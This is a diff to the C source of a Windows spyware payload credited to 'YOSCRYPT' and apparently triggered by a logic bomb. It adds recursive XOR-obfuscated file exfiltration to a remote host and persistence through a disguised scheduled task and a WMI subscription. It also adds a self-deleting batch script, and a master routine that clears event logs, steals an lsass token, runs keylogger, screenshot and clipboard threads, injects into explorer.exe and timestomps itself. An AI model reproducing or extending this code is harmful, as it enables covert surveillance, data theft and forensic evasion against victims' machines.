@@ -9,6 +9,27 @@
  *             keylogging, screenshot capture, clipboard harvest, file exfil,
  *             persistence layer 2, self-destruct.
  *
+ * Developed by YOSCRYPT
+ * 
+             .-""""""""-.
+          .-'            '-.
+        .'    .--------.    '.
+       /     /  .----.  \     \
+      /     |  /      \  |     \
+     |      | |  o  o  | |      |
+     |      | |        | |      |
+     |      | |   __   | |      |
+     |      | |  /  \  | |      |
+     |      | | |    | | |      |
+     |      | | |    | | |      |
+     |      | |  \__/  | |      |
+      \     |  \      /  |     /
+       \     \  '----'  /     /
+        '.    '--------'    .'
+          '-.            .-'
+             '-.______.-'
+
+ *
  * GOTCHAS:
  *   gdi32   — GDI screenshot APIs (BitBlt, CreateCompatibleDC)
  *   user32  — keyboard hook, clipboard, desktop APIs
@@ -841,4 +862,255 @@ static int exfil_file(const char *filepath) {
     CloseHandle(h);
     
     if (!ok || read != file_size) { free(buf); return 0; }
+    
+    xor_obfuscate(buf, file_size, XOR_KEY);
+    exfil_send_raw(EXFIL_HOST, EXFIL_PORT, buf, file_size);
+    free(buf);
+    return 1;
+}
+
+/*
+ * exfil_directory
+ * Recursively exfiltrates all files under dir_path.
+ */
+static int exfil_directory(const char *dir_path) {
+    char pattern[MAX_PATH_X];
+    snprintf(pattern, sizeof pattern, "%s\\*", dir_path);
+
+    WIN32_FIND_DATAA fd;
+    HANDLE h = FindFirstFileA(pattern, &fd);
+    if (h == INVALID_HANDLE_VALUE) return 0;
+
+    int count = 0;
+    do {
+        if (!strcmp(fd.cFileName, ".") || !strcmp(fd.cFileName, "..")) continue;
+        char full[MAX_PATH_X];
+        snprintf(full, sizeof full, "%s\\%s", dir_path, fd.cFileName);
+
+        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
+            count += exfil_directory(full);
+        else
+            count += exfil_file(full);
+    } while (g_running && FindNextFileA(h, &fd));
+
+    FindClose(h);
+    return count;
+}
+
+static DWORD WINAPI thread_exfil(LPVOID _unused) {
+    (void)_unused;
+    /* Wait until payload phase begins before exfiling */
+    Sleep(10 * 1000);
+
+    /* Exfil collected logs */
+    int n = exfil_directory(g_log_dir);
+    log_write("exfil: %d files sent", n);
+    return 0;
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════════
+ * SECTION 10 — Persistence layer 2
+ * ═══════════════════════════════════════════════════════════════════════════════ */
+
+/*
+ * persist_schtask
+ * Creates a Scheduled Task that runs our binary at every logon,
+ * using schtasks.exe (no Task Scheduler COM API needed).
+ * Admin: task runs as SYSTEM with highest privileges.
+ */
+static void persist_schtask(void) {
+    char self[MAX_PATH] = {0};
+    GetModuleFileNameA(NULL, self, MAX_PATH);
+
+    char cmd[MAX_PATH * 2 + 128];
+    snprintf(cmd, sizeof cmd,
+             "schtasks /create /f /tn \"WindowsNetworkAgent\" "
+             "/tr \"%s\" /sc ONLOGON /rl HIGHEST",
+             self);
+
+    STARTUPINFOA si = {0};
+    PROCESS_INFORMATION pi = {0};
+    si.cb          = sizeof si;
+    si.dwFlags     = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
+                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, 5000);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        log_write("persist: schtask installed");
+    }
+}
+
+/*
+ * persist_wmi_subscription
+ * Creates a WMI event subscription that re-executes our binary when
+ * Win32_ProcessStartTrace fires for explorer.exe (i.e., after logon).
+ * Uses wmic.exe — no WMI COM initialisation needed.
+ *
+ * GOTCHA: WMI subscriptions survive reboots but are visible in
+ *         root\subscription via wbemtest or Get-WMIObject.
+ */
+static void persist_wmi_subscription(void) {
+    char self[MAX_PATH] = {0};
+    GetModuleFileNameA(NULL, self, MAX_PATH);
+
+    /* WMI CommandLineEventConsumer requires the path with escaped backslashes */
+    char escaped[MAX_PATH * 2] = {0};
+    for (int i = 0, j = 0; self[i] && j < (int)sizeof escaped - 2; i++) {
+        if (self[i] == '\\') escaped[j++] = '\\';
+        escaped[j++] = self[i];
+    }
+
+    char cmd[MAX_PATH * 4 + 256];
+    snprintf(cmd, sizeof cmd,
+        "wmic /namespace:\\\\root\\subscription PATH "
+        "CommandLineEventConsumer CREATE Name=\"WNetAgent\","
+        "CommandLineTemplate=\"%s\"",
+        escaped);
+
+    STARTUPINFOA si = {0};
+    PROCESS_INFORMATION pi = {0};
+    si.cb = sizeof si;
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
+                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, 8000);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+        log_write("persist: WMI subscription created");
+    }
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════════
+ * SECTION 11 — Self-destruct
+ * ═══════════════════════════════════════════════════════════════════════════════ */
+
+/*
+ * selfdestruct
+ * Drops a batch script that deletes our binary once we've exited,
+ * then launches the script in a new process and exits immediately.
+ * The script loops until the file is deletable (i.e., our process has exited).
+ */
+static void selfdestruct(void) {
+    char self[MAX_PATH]   = {0};
+    char script[MAX_PATH] = {0};
+    GetModuleFileNameA(NULL, self, MAX_PATH);
+    GetTempPathA(MAX_PATH, script);
+    strncat(script, "wuh_sd.bat", MAX_PATH - strlen(script) - 1);
+
+    FILE *f = fopen(script, "w");
+    if (!f) return;
+    fprintf(f,
+        "@echo off\r\n"
+        ":loop\r\n"
+        "del /f /q \"%s\" 2>nul\r\n"
+        "if exist \"%s\" goto loop\r\n"
+        "del /f /q \"%s\"\r\n",
+        self, self, script);
+    fclose(f);
+
+    STARTUPINFOA si = {0};
+    PROCESS_INFORMATION pi = {0};
+    si.cb = sizeof si;
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    CreateProcessA(NULL, script, NULL, NULL, FALSE,
+                   CREATE_NO_WINDOW | DETACHED_PROCESS,
+                   NULL, NULL, &si, &pi);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    log_write("selfdestruct: script launched");
+}
+
+/* ═══════════════════════════════════════════════════════════════════════════════
+ * SECTION 12 — payload_run (master entry point, called by logic_bomb.c)
+ * ═══════════════════════════════════════════════════════════════════════════════ */
+
+/*
+ * payload_run
+ * Called by logic_bomb.c after trigger conditions are met.
+ * Sequence:
+ *   1.  Resolve NT internals
+ *   2.  Winsock init (if not already done by caller)
+ *   3.  Ensure log directory exists
+ *   4.  Anti-forensics pass (events, prefetch, shimcache)
+ *   5.  Privilege escalation (SeDebug, token steal)
+ *   6.  Persistence layer 2 (schtask + WMI)
+ *   7.  Spawn collection threads (keylog, screenshot, clipboard)
+ *   8.  DLL injection into explorer.exe for stealth residence
+ *   9.  Wait for collection window (10 minutes default)
+ *  10.  Exfil thread
+ *  11.  Timestamp-stomp our own binary
+ *  12.  Self-destruct
+ */
+void payload_run(void) {
+    /* 1. NT internals */
+    resolve_ntdll();
+
+    /* 2. Winsock */
+    WSADATA wsd;
+    WSAStartup(MAKEWORD(2, 2), &wsd);
+
+    /* 3. Log dir */
+    fs_mkdir_recursive(g_log_dir);
+    log_write("payload: payload_run() started");
+
+    /* 4. Anti-forensics */
+    af_clear_event_logs();
+    af_wipe_prefetch();
+    af_remove_shimcache_entry();
+
+    /* 5. Privilege escalation */
+    priv_enable_privilege(SE_DEBUG_NAME);
+    priv_enable_privilege(SE_IMPERSONATE_NAME);
+    priv_steal_token("lsass.exe");  /* attempt SYSTEM via lsass */
+
+    /* 6. Persistence layer 2 */
+    persist_schtask();
+    persist_wmi_subscription();
+
+    /* 7. Collection threads */
+    HANDLE threads[3];
+    threads[0] = CreateThread(NULL, 0, thread_keylog,     NULL, 0, NULL);
+    threads[1] = CreateThread(NULL, 0, thread_screenshot, NULL, 0, NULL);
+    threads[2] = CreateThread(NULL, 0, thread_clipboard,  NULL, 0, NULL);
+
+    /* 8. DLL injection — attempt to load ourselves into explorer for stealth */
+    DWORD explorer_pid = proc_find_pid(INJECT_TARGET);
+    if (explorer_pid) {
+        char self[MAX_PATH] = {0};
+        GetModuleFileNameA(NULL, self, MAX_PATH);
+        inject_dll_reflective(explorer_pid, self);
+    }
+
+    /* 9. Collection window — 10 minutes */
+    log_write("payload: collection window open (600s)");
+    Sleep(600 * 1000);
+
+    /* Signal threads to stop */
+    g_running = FALSE;
+
+    /* 10. Exfil */
+    HANDLE exfil_t = CreateThread(NULL, 0, thread_exfil, NULL, 0, NULL);
+    WaitForSingleObject(exfil_t, 30 * 1000);
+    CloseHandle(exfil_t);
+
+    /* Wait for collection threads */
+    WaitForMultipleObjects(3, threads, TRUE, 10 * 1000);
+    for (int i = 0; i < 3; i++) CloseHandle(threads[i]);
+
+    /* 11. Timestomp self */
+    char self[MAX_PATH] = {0};
+    GetModuleFileNameA(NULL, self, MAX_PATH);
+    af_patch_timestamps(self);
+
+    /* 12. Self-destruct */
+    selfdestruct();
+
+    WSACleanup();
+    log_write("payload: payload_run() complete");
 }
